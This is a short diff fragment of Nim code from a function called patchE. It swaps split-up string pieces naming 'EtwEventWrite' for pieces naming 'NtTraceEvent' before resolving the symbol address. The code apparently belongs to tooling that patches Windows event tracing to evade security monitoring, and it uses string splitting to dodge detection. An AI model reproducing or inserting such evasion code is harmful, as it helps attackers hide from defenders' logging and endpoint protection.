@@ -14,9 +14,9 @@ proc patchE(): bool =
         return disabled
 
     let
-        a = "EtwE"
-        b = "ventW"
-        c = "rite"
+        a = "NtT"
+        b = "raceE"
+        c = "vent"
 
     cs = xxx.symAddr(cstring(a & b & c))
     if isNil(cs):
